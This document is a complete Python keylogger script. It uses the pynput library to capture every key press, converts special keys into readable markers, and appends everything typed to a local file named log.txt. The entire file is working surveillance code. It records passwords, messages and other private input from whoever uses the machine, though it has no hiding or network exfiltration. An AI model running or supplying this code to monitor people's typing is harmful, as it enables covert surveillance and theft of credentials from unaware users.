from pynput.keyboard import Listener

# Function to process and log each key press
def write_to_file(key):
    # Convert the key press to a string
    Letter = str(key)
    # Remove single quotes from the key string
    Letter = Letter.replace("'", "")

    # Handling special keys to make the log more readable
    if Letter == 'Key.space':
        Letter = ' '  # Space key
    elif Letter == 'Key.shift':
        Letter = '+Shft+'  # Shift key
    elif Letter == 'Key.ctrl_l':
        Letter = ' Ctrl+'  # Left control key
    elif Letter == 'Key.alt_l':
        Letter = '+Alt+'  # Left alt key
    elif Letter == 'Key.enter':
        Letter = '\n'  # Enter key (newline)
    elif Letter == 'Key.delete':
        Letter = '+Del+'  # Delete key
    elif Letter == 'Key.tab':
        Letter = '\t'  # Tab key
    elif Letter == 'Key.cmd':
        Letter = ' win+'  # Command (Windows) key
    elif Letter == 'Key.backspace':
        Letter = '<-'  # Backspace key
    elif Letter == 'Key.caps_lock':
        Letter = '+CapsL+'  # Caps Lock key

    # Open the log file in append mode and write the key press
    with open("log.txt", 'a') as f:
        f.write(Letter)

# Setting up the listener to monitor key presses and trigger the write_to_file function
with Listener(on_press=write_to_file) as l:
    l.join()  # Start the listener and keep it running
